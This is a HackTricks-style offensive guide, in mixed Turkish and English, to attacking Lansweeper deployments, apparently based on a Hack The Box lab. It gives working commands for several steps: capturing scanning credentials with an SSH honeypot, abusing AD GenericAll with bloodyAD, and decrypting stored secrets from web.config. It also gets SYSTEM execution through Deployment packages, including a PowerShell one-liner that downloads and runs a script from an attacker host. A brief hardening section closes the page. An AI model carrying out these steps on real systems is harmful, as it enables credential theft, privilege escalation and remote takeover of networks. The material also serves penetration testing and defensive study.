# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper, genellikle Windows üzerinde konuşlandırılan ve Active Directory ile entegre edilen bir IT varlık keşif ve envanter platformudur. Lansweeper içinde yapılandırılmış kimlik bilgileri, tarama motorları tarafından SSH, SMB/WMI ve WinRM gibi protokoller üzerinden varlıklara kimlik doğrulaması yapmak için kullanılır. Yanlış yapılandırmalar sıklıkla şunlara izin verir:

- Credential interception by redirecting a scanning target to an attacker-controlled host (honeypot)
- Abuse of AD ACLs exposed by Lansweeper-related groups to gain remote access
- On-host decryption of Lansweeper-configured secrets (connection strings and stored scanning credentials)
- Code execution on managed endpoints via the Deployment feature (often running as SYSTEM)

Bu sayfa, bu davranışlardan yararlanmak için saldırgan iş akışları ve komutların pratik özetlerini sunar.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Yakalanan creds'i DC servislerine karşı doğrulayın:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Diğer protokoller için de benzer şekilde çalışır; scanner'ı listener'ınıza yönlendirebildiğiniz durumlarda (SMB/WinRM honeypots, vb.). SSH genellikle en basit olandır.
- Birçok scanner kendini farklı client banner'larıyla tanımlar (ör. RebexSSH) ve zararsız komutları deneyecektir (uname, whoami, vb.).

## 2) AD ACL abuse: kendinizi bir app-admin grubuna ekleyerek uzak erişim elde edin

Ele geçirilmiş hesaptan etkili izinleri listelemek için BloodHound'u kullanın. Yaygın bir bulgu, scanner- veya uygulamaya özgü bir grup (ör. “Lansweeper Discovery”) tarafından ayrıcalıklı bir grup üzerinde GenericAll yetkisine sahip olunmasıdır (ör. “Lansweeper Admins”). Eğer ayrıcalıklı grup aynı zamanda “Remote Management Users” üyesiyse, kendimizi ekledikten sonra WinRM kullanılabilir hale gelir.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) ile grup üzerindeki GenericAll'ı istismar et:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Sonra etkileşimli bir shell alın:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
İpucu: Kerberos işlemleri zaman duyarlıdır. KRB_AP_ERR_SKEW hatası alırsanız önce DC ile zamanı senkronize edin:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Lansweeper sunucusunda, ASP.NET sitesi genellikle uygulamanın kullandığı şifrelenmiş bir connection string ve simetrik bir anahtar depolar. Uygun yerel erişime sahip olduğunuzda DB connection string'ini decrypt ederek saklanan tarama kimlik bilgilerini çıkarabilirsiniz.

Tipik konumlar:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Saklanan kimlik bilgilerini decrypt edip dumplamak için SharpLansweeperDecrypt'i kullanın:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Beklenen çıktı, DB bağlantı bilgileri ve ortam genelinde kullanılan Windows ve Linux hesapları gibi düz metin tarama kimlik bilgilerini içerir. Bunların çoğu etki alanı sunucularında yükseltilmiş yerel haklara sahiptir:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Ayrıcalıklı erişim için kurtarılan Windows tarama creds'lerini kullan:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Dağıtımı → SYSTEM RCE

“Lansweeper Admins” üyesi olarak, web arayüzü Dağıtım ve Yapılandırma bölümlerini sunar. Deployment → Deployment packages altında, hedeflenen varlıklarda rastgele komutlar çalıştıran paketler oluşturabilirsiniz. Çalıştırma, Lansweeper servisi tarafından yüksek ayrıcalıkla gerçekleştirilir ve seçilen host üzerinde NT AUTHORITY\SYSTEM olarak kod çalıştırma sağlar.

Yüksek seviye adımlar:
- PowerShell veya cmd bir satırlık (one-liner) çalıştıran yeni bir Deployment paketi oluşturun (reverse shell, add-user, vb.).
- İstediğiniz varlığı hedefleyin (ör. Lansweeper'ın çalıştığı DC/host) ve Deploy/Run now'a tıklayın.
- Shell'inizi SYSTEM olarak yakalayın.

Örnek payloadlar (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment işlemleri gürültülüdür ve Lansweeper ile Windows event logs içinde kayıt bırakır. İhtiyatla kullanın.

## Tespit ve sertleştirme

- Anonim SMB enumerasyonlarını kısıtlayın veya kaldırın. RID cycling'i ve Lansweeper paylaşımlarına yönelik anormal erişimleri izleyin.
- Egress kontrolleri: scanner hostlarından çıkan SSH/SMB/WinRM trafiğini engelleyin veya sıkı şekilde kısıtlayın. Standartsız portlar (ör., 2022) ve Rebex gibi alışılmadık istemci banner'ları için uyarı oluşturun.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. Gizli bilgileri bir vault'a dışarı aktarın ve açığa çıkma durumunda rotate edin. Mümkünse minimal ayrıcalıklara sahip service account'lar ve gMSA kullanmayı değerlendirin.
- AD izleme: Lansweeper ile ilgili gruplardaki değişiklikler (örn., “Lansweeper Admins”, “Remote Management Users”) ve ayrıcalıklı gruplara GenericAll/Write üyeliği veren ACL değişiklikleri için uyarı oluşturun.
- Deployment paketlerinin oluşturulmasını/değiştirilmesini/çalıştırılmasını denetleyin; cmd.exe/powershell.exe başlatan paketler veya beklenmeyen outbound bağlantılar için uyarı verin.

## İlgili konular
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
